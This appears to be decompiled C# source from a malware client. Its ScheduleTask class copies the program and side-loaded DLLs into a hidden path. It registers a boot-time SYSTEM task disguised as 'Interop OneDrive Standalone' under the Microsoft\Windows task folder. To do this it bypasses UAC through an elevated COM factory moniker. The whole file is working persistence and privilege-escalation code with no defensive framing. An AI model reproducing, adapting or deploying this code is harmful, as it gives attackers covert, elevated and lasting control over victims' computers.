using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using TaskScheduler;

namespace newClient.Utilities;

public class ScheduleTask
{
	[Guid("804bd226-af47-4d71-b492-443a57610b08")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	private interface IElevatedFactoryServer
	{
		[return: MarshalAs(UnmanagedType.Interface)]
		object ServerCreateElevatedObject([In][MarshalAs(UnmanagedType.LPStruct)] Guid rclsid, [In][MarshalAs(UnmanagedType.LPStruct)] Guid riid);
	}

	public struct BIND_OPTS3
	{
		public uint cbStruct;

		public uint grfFlags;

		public uint grfMode;

		public uint dwTickCountDeadline;

		public uint dwTrackFlags;

		public uint dwClassContext;

		public uint locale;

		public IntPtr pServerInfo;

		public IntPtr hwnd;
	}

	public delegate void supxLdrEnumModulesCallback(IntPtr DataTableEntry, IntPtr Context, out bool StopEnumeration);

	private static readonly string Taskname = "Interop OneDrive Standalone";

	private static readonly string taskPath = "\\Microsoft\\Windows";

	private static string xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n<Task version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n  <RegistrationInfo>\r\n    <Description>ConsoleProgramTask</Description>\r\n  </RegistrationInfo>\r\n  <Triggers>\r\n    <BootTrigger>\r\n      <Enabled>true</Enabled>\r\n    </BootTrigger>\r\n  </Triggers>\r\n  <Principals>\r\n    <Principal id=\"Author\">\r\n      <UserId>SYSTEM</UserId>\r\n      <RunLevel>HighestAvailable</RunLevel>\r\n    </Principal>\r\n  </Principals>\r\n  <Settings>\r\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\r\n    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\r\n    <AllowHardTerminate>true</AllowHardTerminate>\r\n    <StartWhenAvailable>false</StartWhenAvailable>\r\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\r\n    <IdleSettings>\r\n      <Duration>PT10M</Duration>\r\n      <WaitTimeout>PT1H</WaitTimeout>\r\n      <StopOnIdleEnd>true</StopOnIdleEnd>\r\n      <RestartOnIdle>false</RestartOnIdle>\r\n    </IdleSettings>\r\n    <AllowStartOnDemand>true</AllowStartOnDemand>\r\n    <Enabled>true</Enabled>\r\n    <Hidden>false</Hidden>\r\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\r\n    <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>\r\n    <WakeToRun>false</WakeToRun>\r\n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\r\n    <Priority>7</Priority>\r\n  </Settings>\r\n  <Actions Context=\"Author\">\r\n    <Exec>\r\n      <Command>&</Command>\r\n    </Exec>\r\n  </Actions>\r\n</Task>";

	public static string copyNewPath(string processPath)
	{
		if (!Directory.Exists(config.path))
		{
			Directory.CreateDirectory(config.path);
		}
		string text = Path.Combine(Path.GetDirectoryName(processPath), "Oncode.db");
		string text2 = Path.Combine(Path.GetDirectoryName(processPath), "msvcr120.dll");
		string text3 = Path.Combine(Path.GetDirectoryName(processPath), "jli.dll");
		string text4 = Path.Combine(config.path, Path.GetFileName(processPath));
		string text5 = Path.Combine(config.path, Path.GetFileName(text));
		string text6 = Path.Combine(config.path, Path.GetFileName(text2));
		string text7 = Path.Combine(config.path, Path.GetFileName(text3));
		using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + Environment.MachineName))
		{
			registryKey.SetValue(Environment.MachineName + "newpath", text4);
		}
		if (File.Exists(processPath) && !File.Exists(text4))
		{
			File.Copy(processPath, text4);
		}
		if (File.Exists(text) && !File.Exists(text5))
		{
			File.Copy(text, text5);
		}
		if (File.Exists(text2) && !File.Exists(text6))
		{
			File.Copy(text2, text6);
		}
		if (File.Exists(text3) && !File.Exists(text7))
		{
			File.Copy(text3, text7);
		}
		return text4;
	}

	public static void CreateTask(string command)
	{
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		if (command.Contains("svchost") || command.Contains("OnBlindMark") || command.Contains("PendingGPOs"))
		{
			return;
		}
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(command));
		if (!Directory.Exists(config.path + "\\" + text))
		{
			Directory.CreateDirectory(config.path + "\\" + text);
		}
		string newValue = copyNewPath(command);
		try
		{
			string text2 = xml.Replace("&", newValue);
			TaskSchedulerClass val = new TaskSchedulerClass();
			val.Connect(Type.Missing, Type.Missing, Type.Missing, Type.Missing);
			ITaskFolder folder = val.GetFolder(taskPath);
			if (!QueryTask())
			{
				RPCCreateTask(text2);
				if (!QueryTask())
				{
					folder.RegisterTask(Taskname, text2, 0, (object)null, (object)null, (_TASK_LOGON_TYPE)3, (object)null);
				}
			}
		}
		catch (Exception ex)
		{
			Logger.Info(ex.Message);
		}
	}

	public static void deletetask()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		try
		{
			TaskSchedulerClass val = new TaskSchedulerClass();
			val.Connect(Type.Missing, Type.Missing, Type.Missing, Type.Missing);
			val.GetFolder(taskPath).DeleteTask(Taskname, 0);
		}
		catch (Exception ex)
		{
			Logger.Info(ex.Message);
		}
	}

	public static bool QueryTask()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		try
		{
			TaskSchedulerClass val = new TaskSchedulerClass();
			val.Connect(Type.Missing, Type.Missing, Type.Missing, Type.Missing);
			foreach (IRegisteredTask task in val.GetFolder(taskPath).GetTasks(1))
			{
				IRegisteredTask val2 = task;
				if (val2.get_Name().Equals(Taskname))
				{
					return true;
				}
			}
		}
		catch (Exception ex)
		{
			Logger.Info(ex.Message);
		}
		return false;
	}

	private static void RPCCreateTask(string newxml)
	{
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			BIND_OPTS3 pBindOptions = default(BIND_OPTS3);
			pBindOptions.cbStruct = (uint)Marshal.SizeOf((object)pBindOptions);
			pBindOptions.dwClassContext = 4u;
			object obj = (CoGetObject("Elevation:Administrator!new:{A6BFEA43-501F-456F-A845-983D3AD7B8F0}", ref pBindOptions, new Guid("{00000000-0000-0000-C000-000000000046}")) as IElevatedFactoryServer).ServerCreateElevatedObject(new Guid("{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}"), new Guid("{00000000-0000-0000-C000-000000000046}"));
			object obj2 = ((obj is ITaskService) ? obj : null);
			((ITaskService)obj2).Connect(Type.Missing, Type.Missing, Type.Missing, Type.Missing);
			((ITaskService)obj2).GetFolder(taskPath).RegisterTask(Taskname, newxml, 0, (object)null, (object)null, (_TASK_LOGON_TYPE)3, (object)null);
		}
		catch (Exception ex)
		{
			Logger.Info(ex.Message);
		}
	}

	[DllImport("ole32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, PreserveSig = false)]
	[return: MarshalAs(UnmanagedType.Interface)]
	private static extern object CoGetObject(string pszName, [In] ref BIND_OPTS3 pBindOptions, [In][MarshalAs(UnmanagedType.LPStruct)] Guid riid);

	[DllImport("ntdll.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern void RtlInitUnicodeString(IntPtr desc, string str);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern int LdrEnumerateLoadedModules(int Flags, supxLdrEnumModulesCallback CallbackFunction, IntPtr Context);
}
